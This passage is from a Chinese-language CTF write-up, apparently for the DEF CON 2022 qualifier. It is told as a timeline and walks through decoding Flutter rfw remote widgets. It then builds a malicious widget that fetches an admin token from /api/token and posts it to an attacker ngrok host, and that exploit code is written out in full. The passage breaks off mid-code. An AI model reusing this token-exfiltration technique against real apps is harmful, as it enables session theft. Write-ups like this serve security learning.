                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‹¿ä¾† decode çš„ç¨‹å¼ç¢¼ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token string">'dart:io'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">'package:rfw/formats.dart'</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> async <span class="token punctuation">&#123;</span>
  final File currentFile <span class="token operator">=</span> <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">'chatmessage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">decodeLibraryBlob</span><span class="token punctuation">(</span><span class="token keyword">await</span> currentFile<span class="token punctuation">.</span><span class="token function">readAsBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤æ™‚æˆ‘ç ”ç©¶çš„æ–¹å‘æ˜¯ã€Œå¦‚ä½•å¯«ä¸€å€‹å¯ä»¥ XSS çš„ flutter widgetã€ï¼Œæˆ‘åŸæœ¬æƒ³çš„è·¯æœ‰ä¸‰æ¢ï¼š</p>
<ol>
<li>ç›´æ¥å¯«å…¥ HTMLï¼Œåƒæ˜¯ React é‚£æ¨£</li>
<li>ç›´æ¥å¯« JS codeï¼Œä¾‹å¦‚èªª widget çš„ onload äº‹ä»¶å¯ä»¥ <code>eval()</code> ä¹‹é¡çš„</li>
<li>ç”¨ iframe src æˆ–æ˜¯ srcdoc ä¾† XSS</li>
</ol>
<p>æœ¬ä¾†æƒ³èªªå¾ˆç°¡å–®å˜›ï¼Œç¾åœ¨å°±åªè¦æ‰¾åˆ°æ€éº¼åœ¨ flutter è£¡é¢å¡ä»»æ„ HTML å°±çµæŸäº†ï¼Œä¸éè¶Šç ”ç©¶è¶Šç™¼ç¾å¥½åƒä¸æ˜¯é€™éº¼ç°¡å–®ã€‚åŸæœ¬ä»¥ç‚º flutter æ˜¯åƒ React&#x2F;Vue é‚£æ¨£ï¼Œå¾Œä¾†æ‰ç™¼ç¾æ˜¯æœ‰ä¸€æ•´å¥—è‡ªå·±çš„ç³»çµ±è·Ÿèªæ³•ï¼Œæ˜¯å®Œå…¨ä¸åŒçš„æ±è¥¿ã€‚</p>
<p>ä½ æ²’è¾¦æ³•å¯« HTMLï¼Œä¹Ÿæ²’è¾¦æ³•å¯« JSï¼Œå„˜ç®¡ iframe å¯ä»¥ç”¨ï¼Œä½†é‚£è¦å¼•å…¥åˆ¥çš„ libraryï¼Œç”¨åœ¨é€™é¡Œæœƒå‡ºéŒ¯ã€‚</p>
<p>ä¸éå› ç‚ºé€™æ™‚ä¹Ÿæ²’æœ‰åˆ¥çš„ç·šç´¢ï¼Œå°±ç¹¼çºŒæœé€™æ¢è·¯ç ”ç©¶ã€‚</p>
<h3><span id="19371h-57m-å»åƒé£¯">19:37(1h 57m) å»åƒé£¯</span></h3><p>åŸæœ¬æƒ³èªªåƒå®Œé£¯å‰è§£å®Œçš„ï¼Œå¤ªå¤©çœŸã€‚</p>
<h3><span id="20122h-32m-åƒå®Œé£¯å›ä¾†ç¹¼çºŒæˆ°é¬¥">20:12(2h 32m) åƒå®Œé£¯å›ä¾†ç¹¼çºŒæˆ°é¬¥</span></h3><h3><span id="20262h-46m-æ‰¾åˆ°æ­£ç¢ºçš„æ–¹å‘">20:26(2h 46m) æ‰¾åˆ°æ­£ç¢ºçš„æ–¹å‘</span></h3><p>æ­¤æ™‚å› ç‚ºæ’å…¥ HTML&#x2F;JS çš„è·¯ä¼¼ä¹èµ°ä¸é€šï¼Œæ‰€ä»¥æˆ‘åœ¨æƒ³æ˜¯ä¸æ˜¯æˆ‘æƒ³éŒ¯äº†æ–¹å‘ï¼Œé€™é¡Œæ‡‰è©²è¦å€ŸåŠ©ä¸€äº›ç¾æœ‰çš„æ©Ÿåˆ¶ã€‚</p>
<p>è€Œå‰›å¥½é€™å€‹æ™‚å€™éšŠå‹ä¹Ÿè«‹æˆ‘å¹«å¿™ decode poll widgetï¼Œçœ‹åˆ°å…§å®¹ä»¥å¾Œå°±ç¢ºå®šé€™æ–¹å‘æ‰æ˜¯å°çš„ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">widget root <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> From
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>author<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
                    <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4278230474</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Padding</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">padding</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>title
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">switch</span> state<span class="token punctuation">.</span>loaded <span class="token punctuation">&#123;</span>
                <span class="token boolean">true</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token operator">...</span>
                        <span class="token keyword">for</span> loop <span class="token keyword">in</span> data<span class="token punctuation">.</span>poll_options<span class="token operator">:</span> <span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                            <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Padding</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">ElevatedButton</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                    <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                        <span class="token literal-property property">text</span><span class="token operator">:</span> loop0<span class="token punctuation">.</span>text
                                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                    <span class="token literal-property property">onPressed</span><span class="token operator">:</span> event api_post <span class="token punctuation">&#123;</span>
                                        <span class="token literal-property property">path</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>apiVote<span class="token punctuation">,</span>
                                        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                            <span class="token literal-property property">selection</span><span class="token operator">:</span> loop0<span class="token punctuation">.</span>text
                                        <span class="token punctuation">&#125;</span>
                                    <span class="token punctuation">&#125;</span>
                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                <span class="token literal-property property">padding</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token number">10.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">]</span>
                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                <span class="token literal-property property">text</span><span class="token operator">:</span> loop0<span class="token punctuation">.</span>count
                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">TextButton</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                            <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                <span class="token literal-property property">text</span><span class="token operator">:</span> Refresh<span class="token punctuation">,</span>
                                <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                    <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4294942366</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">onPressed</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token boolean">false</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                    <span class="token punctuation">]</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">null</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">url</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>apiGet<span class="token punctuation">,</span>
                    <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> options<span class="token punctuation">,</span>
                    <span class="token literal-property property">dataKey</span><span class="token operator">:</span> poll_options<span class="token punctuation">,</span>
                    <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token boolean">true</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€åº•ä¸‹é‚£å€‹ ApiMapper æ˜¯é—œéµï¼Œçœ‹èµ·ä¾†å¯ä»¥ç™¼ APIï¼Œé›–ç„¶é‚„ä¸çŸ¥é“ç™¼ API å¯ä»¥å¹¹å˜›ï¼Œä½†å…ˆå˜—è©¦çœ‹çœ‹å°±å°äº†ã€‚</p>
<p>æ¥è‘—æˆ‘å°±æƒ³è¾¦æ³•åœ¨ local çœ‹èƒ½ä¸èƒ½é‡æ–° build å‡ºä¸€æ¨£çš„ widgetï¼Œçµæœæ€éº¼è·‘éƒ½æœ‰éŒ¯ï¼ŒèŠ±äº†ä¸€å †æ™‚é–“ã€‚</p>
<h3><span id="21113h-31m-æ‰¾åˆ°æ­£ç¢ºçš„-build-æ³•">21:11(3h 31m) æ‰¾åˆ°æ­£ç¢ºçš„ build æ³•</span></h3><p>ç¶“éå„å¼å„æ¨£çš„å˜—è©¦ä¹‹å¾Œï¼Œæˆ‘ç™¼ç¾åœ¨é ç«¯çš„æª”æ¡ˆä¸­æœ‰ä¸€å€‹ <code>local</code> çš„å­—ï¼Œä½†æ˜¯åœ¨æœ¬æ©Ÿæƒ³é‡ç¾æ™‚ï¼Œbuild å‡ºä¾†å»æ²’æœ‰ã€‚æ–¼æ˜¯æˆ‘çŒœæ¸¬æœƒä¸æœƒæ˜¯å‰é¢æœ‰å€‹ <code>import local</code>ï¼Œçµæœé‚„çœŸçš„æ˜¯é€™æ¨£ã€‚</p>
<p>æ­¤æ™‚çµ‚æ–¼è©¦å‡ºä¾†æ‡‰è©²è¦æ€æ¨£æ‰èƒ½ build å‡ºä¸€å€‹èƒ½ç”¨ ApiMapper çš„ widgetã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> core<span class="token punctuation">.</span>widgets<span class="token punctuation">;</span>
<span class="token keyword">import</span> core<span class="token punctuation">.</span>material<span class="token punctuation">;</span>
<span class="token keyword">import</span> local<span class="token punctuation">;</span>

widget root <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span>
  <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token function">Row</span><span class="token punctuation">(</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">Text</span><span class="token punctuation">(</span> text<span class="token operator">:</span> <span class="token string">'pewpew'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">Expanded</span><span class="token punctuation">(</span>
            <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span>
              <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>author<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
              <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4278230474</span> <span class="token punctuation">&#125;</span>
            <span class="token punctuation">)</span>
          <span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
            <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>abc <span class="token operator">=</span> <span class="token string">'abc'</span>
          <span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸éåšåˆ°é€™æ­¥ä»¥å¾Œåˆå¡é—œäº†ï¼Œå› ç‚º ApiMapper åªèƒ½é€ GET requestï¼Œæ²’æœ‰è¾¦æ³• POSTï¼Œå¾ source code è£¡é¢ä¹Ÿå¯ä»¥è­‰æ˜é€™é»ï¼š</p>
<p><img src="/img/defcon-2022-qual-writeup/p4.png" alt="ApiMapper"></p>
<h3><span id="21303h-50m-æœ‰å…¶ä»–éšŠä¼è§£é–‹äº†">21:30(3h 50m) æœ‰å…¶ä»–éšŠä¼è§£é–‹äº†</span></h3><p>æœ¬ä¾†æƒ³æ‹¿ first blood çš„ï¼ŒæŠ€ä¸å¦‚äººåªå¥½QQ</p>
<p>æ­¤æ™‚æˆ‘é‚„åœ¨ç ”ç©¶ source codeï¼Œç„¡è«–æ˜¯é¡Œç›®çš„é‚„æ˜¯ rfw çš„éƒ½æœ‰çœ‹ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°æ›´å¤šç·šç´¢ã€‚</p>
<h3><span id="21434h-03m-æ‰¾åˆ°å…¶ä»–é—œéµ">21:43(4h 03m) æ‰¾åˆ°å…¶ä»–é—œéµ</span></h3><p>æˆ‘è·ŸéšŠå‹éƒ½ç™¼ç¾äº†åœ¨ poll widget è£¡é¢æœ‰å€‹ <code>event api_post</code>ï¼Œå¯ä»¥æ‹¿ä¾†é€å‡º POST requestï¼Œä¸éè§¸ç™¼çš„æ–¹å¼ä¸å¤ªç¢ºå®šï¼Œè¦è©¦è©¦çœ‹ã€‚</p>
<h3><span id="22224h-42m-æˆåŠŸè§¸ç™¼-event">22:22(4h 42m) æˆåŠŸè§¸ç™¼ event</span></h3><p>éšŠå‹æˆåŠŸæ‰¾åˆ°äº†è§¸ç™¼æ–¹å¼ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
            <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> event <span class="token string">"api_post"</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/test"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token string">"bodytest"</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘è‡ªå·±å…¶å¯¦ä¹Ÿæœ‰è©¦éä¸€æ¨£çš„æ–¹æ³•ï¼Œä½†ä¸çŸ¥é“ç‚ºä»€éº¼æ²’æœ‰æˆåŠŸã€‚</p>
<p>é›–ç„¶å¯ä»¥ç™¼ POST requestï¼Œå¯æ˜¯æˆ‘å€‘æ‹¿ä¸åˆ° responseï¼Œæ‰€ä»¥ä¼¼ä¹ä¹Ÿæ²’ä»€éº¼ç”¨è™•ã€‚æ­¤æ™‚åˆåœ¨é€™é‚Šå¡äº†ä¸€é™£å­ã€‚</p>
<p>è€Œæˆ‘è¦ºå¾—æˆ‘å€‘æ‡‰è©²æœ‰å¿½ç•¥ä»€éº¼é‡è¦çš„ç´°ç¯€ï¼Œæ‰æœƒå¡åœ¨é€™é‚Šï¼Œä¸ç„¶æ€éº¼çœ‹é€™ä¸€æ­¥éƒ½æ‡‰è©²å¿«åˆ°çµå°¾äº†ã€‚æ–¼æ˜¯æˆ‘é‡æ–°å›å»ç©äº†ä¸€é appï¼Œçœ‹ä¸€ä¸‹æœ‰æ²’æœ‰ä»€éº¼éºæ¼çš„åœ°æ–¹ã€‚</p>
<h3><span id="22565h-16m-é‡å›æ­£è»Œé–‹å§‹å¯¦ä½œ-exploit">22:56(5h 16m) é‡å›æ­£è»Œï¼Œé–‹å§‹å¯¦ä½œ exploit</span></h3><p>é‡æ–°ç©äº†ä¸€éä¹‹å¾ŒæœçœŸç™¼ç¾æœ‰åœ°æ–¹æ²’æ³¨æ„åˆ°ï¼Œé‚£å°±æ˜¯æœ‰ä¸€å€‹ GET çš„ API æ˜¯ <code>/api/token</code> å¯ä»¥æ‹¿åˆ° token è³‡æ–™ï¼Œè€Œç”¨ ApiMapper æ‹¿å›ä¾†çš„è³‡æ–™æœƒå­˜åœ¨ <code>data</code> è£¡é¢ï¼Œæ‰€ä»¥å¯ä»¥å…ˆç”¨ ApiMapper æ‹¿è³‡æ–™ï¼Œæ¥è‘—å†ç”¨ <code>event &quot;api_post&quot;</code> æŠŠæ‹¿åˆ°çš„è³‡æ–™é€å‡ºå»ï¼Œå°±å¯ä»¥ç²å¾— admin tokenã€‚</p>
<p>æ¦‚å¿µä¸é›£ï¼Œä½†é›£çš„æ˜¯å¯¦ä½œã€‚åœ¨é€™é‚ŠèŠ±äº†ä¸€é»æ™‚é–“è·ŸéšŠå‹åˆ†äº«äº†ä¸€ä¸‹é€™å€‹æ€è·¯ï¼Œæƒ³èªªå¤§å®¶ä¸€èµ·ä¾†å¯«æœƒæ¯”è¼ƒå¿«ã€‚</p>
<p>å˜—è©¦çš„éç¨‹ä¸­ç™¼ç¾å¦‚æœæ˜¯ ApiMapper çš„ onloaded ç›´æ¥æ¥ <code>event &quot;api_post&quot;</code> çš„è©±ï¼Œå¥½åƒæœƒæ‹¿ä¸åˆ°è³‡æ–™ï¼Œæ‰€ä»¥éœ€è¦æ‰¾å…¶ä»–ç¨®æ–¹å¼ã€‚é€™æ™‚å€™å°±æƒ³åˆ°äº† poll ä¸­å‡ºç¾çš„ <code>switch</code>ï¼Œæ‡‰è©²å¯ä»¥ç”¨é‚£ä¸€æ‹›ä¾†åšã€‚</p>
<p>è©±èªªå­¸ç¿’ rfw çš„æ–¹å¼æ˜¯ç›´æ¥çœ‹ codeï¼Œå…¶å¯¦è¨»è§£è·Ÿæ¸¬è©¦å¯«å¾—éƒ½æ»¿è©³ç´°çš„ï¼Œæ¯”æ–‡ä»¶çš„è³‡æ–™å¤šå¾ˆå¤šï¼š<a target="_blank" rel="noopener" href="https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479">https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479</a></p>
<h3><span id="23195h-39m-å¤±æ•—çš„-exploit">23:19(5h 39m) å¤±æ•—çš„ exploit</span></h3><p>æˆ‘å¯«äº†ä¸€å€‹æˆ‘è‡ªå·±è¦ºå¾—æ€éº¼çœ‹éƒ½æœƒæˆåŠŸçš„ widgetï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">widget root <span class="token punctuation">&#123;</span> <span class="token literal-property property">loaded</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span>
  <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">Text</span><span class="token punctuation">(</span>
            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">"test"</span>
          <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token keyword">switch</span> state<span class="token punctuation">.</span>loaded <span class="token punctuation">&#123;</span>
            <span class="token number">2</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
              <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> event <span class="token string">"api_post"</span> <span class="token punctuation">&#123;</span>
                <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/send"</span><span class="token punctuation">,</span>
                <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                  <span class="token string-property property">"token"</span><span class="token operator">:</span> data<span class="token punctuation">.</span>new_token
                <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token number">1</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
              <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span>
              <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'yo'</span>
            <span class="token punctuation">)</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†ä¸çŸ¥é“ç‚ºä»€éº¼å¤±æ•—äº†ï¼Œç¬¬äºŒå€‹ request ç™¼ä¸å‡ºå»ï¼Œåªå¥½ç¹¼çºŒå˜—è©¦å…¶ä»–åšæ³•ã€‚</p>
<h3><span id="23255h-45m-è§£é–‹å›‰">23:25(5h 45m) è§£é–‹å›‰ ğŸ‰</span></h3><p>æœ€å¾Œæ˜¯ç”¨é€™æ¨£ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> core<span class="token punctuation">.</span>widgets<span class="token punctuation">;</span>
<span class="token keyword">import</span> core<span class="token punctuation">.</span>material<span class="token punctuation">;</span>
<span class="token keyword">import</span> local<span class="token punctuation">;</span>

widget root <span class="token punctuation">&#123;</span> <span class="token literal-property property">loaded</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span>
  <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">Text</span><span class="token punctuation">(</span>
            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">"test"</span>
          <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
            <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> event <span class="token string">"api_post"</span> <span class="token punctuation">&#123;</span>
